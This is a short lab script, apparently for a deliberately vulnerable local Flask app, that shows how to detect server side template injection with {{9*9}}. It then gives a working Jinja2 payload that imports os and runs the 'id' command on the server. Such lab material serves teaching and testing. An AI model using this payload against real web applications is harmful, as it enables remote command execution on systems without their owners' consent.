run_ssti.sh
#uses template/ssti.html
#use something like burp suite or just a normal browser
browse to http://0.0.0.0:5000/
set username to {{9*9}}
# this should return hello 81! (i.e. the python interpreter has executed 9*9)
# this indicates that this web app is vunerable to server side template injection
# a more complex attack that runs the 'id' command is as follows
set username to {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
